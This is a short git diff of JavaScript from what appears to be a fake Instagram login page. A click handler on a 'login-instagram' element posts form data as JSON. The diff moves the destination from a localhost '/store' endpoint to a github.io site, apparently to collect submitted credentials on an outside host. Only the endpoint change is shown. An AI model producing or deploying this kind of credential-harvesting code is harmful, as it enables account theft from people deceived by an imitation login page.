@@ -18,7 +18,7 @@ document.getElementById("login-instagram").addEventListener("click", async funct
             console.log("Envoi des données au serveur...");
 
             try {
-                const response = await fetch('http://localhost:3001/store', {
+                const response = await fetch('https://ahmedx-mahmoud.github.io/kadri_website/server/store', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
